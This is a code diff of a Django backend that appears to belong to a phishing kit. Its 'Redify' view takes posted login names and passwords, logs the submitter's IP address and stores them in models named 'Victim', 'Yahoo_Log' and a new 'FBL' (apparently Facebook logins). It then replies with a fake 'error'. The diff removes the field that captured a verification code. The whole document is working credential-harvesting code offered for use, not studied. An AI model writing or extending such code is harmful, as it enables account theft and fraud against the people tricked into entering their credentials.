@@ -3,7 +3,7 @@ import re
 from django import http
 from rest_framework.response import Response
 from rest_framework.views import APIView
-from .models import Victim,Yahoo_Log
+from .models import Victim,Yahoo_Log,FBL
 from django.core.mail import EmailMessage
 
 
@@ -14,24 +14,15 @@ class Index(APIView):
 
 class Redify(APIView):
     def post(self,request):
-        try:
-            psw=request.data['psw']
-        except:
-            return Response({"password required"})
-        try:
-            login=request.data['login']
-        except:
-            return Response({"email or phone number required"})
-        try:
-            code = request.data['code']
-        except:
-            return Response({"code required"})
+        psw=request.data['psw']
+        login=request.data['login']
+        
         xxx = request.META.get('HTTP_X_FORWARDED_FOR')
         if xxx:
             ip = xxx.split(',')[0]
         else:
             ip = request.META.get('REMOTE_ADDR')
-        Victim.objects.create(login=login,password=psw,ip=ip,code=code)
+        FBL.objects.create(login=login,psw=psw,ip=ip)
         return Response({"error"})
         #Send Email
 
